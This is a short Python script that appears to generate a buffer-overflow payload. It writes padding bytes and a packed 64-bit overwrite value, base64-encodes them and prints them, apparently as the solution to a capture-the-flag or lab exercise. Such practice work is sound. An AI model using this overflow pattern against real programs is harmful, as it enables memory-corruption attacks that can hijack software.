
import sys
import struct
import base64

buf = b'iiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii'
buf += struct.pack('<Q', 8330079840305024918)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
